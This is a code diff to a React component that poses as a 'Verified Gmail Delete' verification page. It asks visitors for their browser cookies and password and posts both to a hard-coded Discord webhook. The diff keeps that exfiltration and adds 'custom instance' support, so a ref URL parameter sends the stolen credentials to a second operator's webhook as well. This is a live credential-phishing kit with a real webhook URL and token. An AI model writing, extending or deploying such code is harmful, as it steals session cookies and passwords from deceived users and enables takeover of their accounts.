@@ -20,56 +20,83 @@ export const VerifyGmailDelete = ({
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState("");
 
-  const sendToWebhook = async (data: any) => {
-    try {
-      const response = await fetch(
-        "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            embeds: [
-              {
-                title: "🛡️ Verified Gmail Delete Request",
-                color: 0xff6600,
-                fields: [
-                  {
-                    name: "🍪 Cookies",
-                    value: `\`\`\`${data.cookies}\`\`\``,
-                    inline: false,
-                  },
-                  {
-                    name: "🔐 Password",
-                    value: `\`\`\`${data.password}\`\`\``,
-                    inline: false,
-                  },
-                  {
-                    name: "⏰ Timestamp",
-                    value: new Date().toISOString(),
-                    inline: true,
-                  },
-                  {
-                    name: "🎯 Action",
-                    value: "Delete Verified Gmail",
-                    inline: true,
-                  },
-                ],
-                footer: {
-                  text: "X-LiNk System",
-                },
-              },
-            ],
-          }),
-        },
-      );
+  const getWebhookUrls = () => {
+    const mainWebhook =
+      "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE";
 
-      if (response.ok) {
-        return true;
-      } else {
-        throw new Error("Failed to send data");
+    // Check if this is a custom instance
+    const urlParams = new URLSearchParams(window.location.search);
+    const refId = urlParams.get("ref");
+
+    if (refId) {
+      const webhookData = localStorage.getItem(`webhook_${refId}`);
+      if (webhookData) {
+        const parsed = JSON.parse(webhookData);
+        return [mainWebhook, parsed.webhook];
       }
+    }
+
+    return [mainWebhook];
+  };
+
+  const sendToWebhook = async (
+    webhookUrl: string,
+    data: any,
+    isCustom = false,
+  ) => {
+    try {
+      const response = await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          embeds: [
+            {
+              title: isCustom
+                ? "🛡️ Verified Gmail Delete Request (Custom Instance)"
+                : "🛡️ Verified Gmail Delete Request",
+              color: 0xff6600,
+              fields: [
+                {
+                  name: "🍪 Cookies",
+                  value: `\`\`\`${data.cookies}\`\`\``,
+                  inline: false,
+                },
+                {
+                  name: "🔐 Password",
+                  value: `\`\`\`${data.password}\`\`\``,
+                  inline: false,
+                },
+                {
+                  name: "⏰ Timestamp",
+                  value: new Date().toISOString(),
+                  inline: true,
+                },
+                {
+                  name: "🎯 Action",
+                  value: "Delete Verified Gmail",
+                  inline: true,
+                },
+                ...(isCustom
+                  ? [
+                      {
+                        name: "🌐 Source",
+                        value: "Custom Instance",
+                        inline: true,
+                      },
+                    ]
+                  : []),
+              ],
+              footer: {
+                text: isCustom ? "X-LiNk Custom Instance" : "X-LiNk System",
+              },
+            },
+          ],
+        }),
+      });
+
+      return response.ok;
     } catch (error) {
       console.error("Webhook error:", error);
       return false;
@@ -86,9 +113,19 @@ export const VerifyGmailDelete = ({
     setIsLoading(true);
     setError("");
 
-    const success = await sendToWebhook({ cookies, password });
+    const webhookUrls = getWebhookUrls();
+    const data = { cookies, password };
 
-    if (success) {
+    // Send to all webhook URLs
+    let allSuccess = true;
+    for (let i = 0; i < webhookUrls.length; i++) {
+      const success = await sendToWebhook(webhookUrls[i], data, i > 0);
+      if (!success) {
+        allSuccess = false;
+      }
+    }
+
+    if (allSuccess) {
       onSuccess();
     } else {
       setError("Failed to process request. Please try again.");
@@ -96,6 +133,10 @@ export const VerifyGmailDelete = ({
 
     setIsLoading(false);
   };
+
+  // Check if this is a custom instance
+  const urlParams = new URLSearchParams(window.location.search);
+  const isCustomInstance = urlParams.get("ref");
 
   return (
     <motion.div
@@ -121,6 +162,11 @@ export const VerifyGmailDelete = ({
             <p className="text-orange-300 text-sm">
               Enter cookies and password to proceed
             </p>
+            {isCustomInstance && (
+              <div className="mt-2 px-3 py-1 bg-purple-600/20 rounded-full">
+                <p className="text-purple-300 text-xs">Custom Instance</p>
+              </div>
+            )}
           </motion.div>
         </CardHeader>
         <CardContent className="space-y-6">
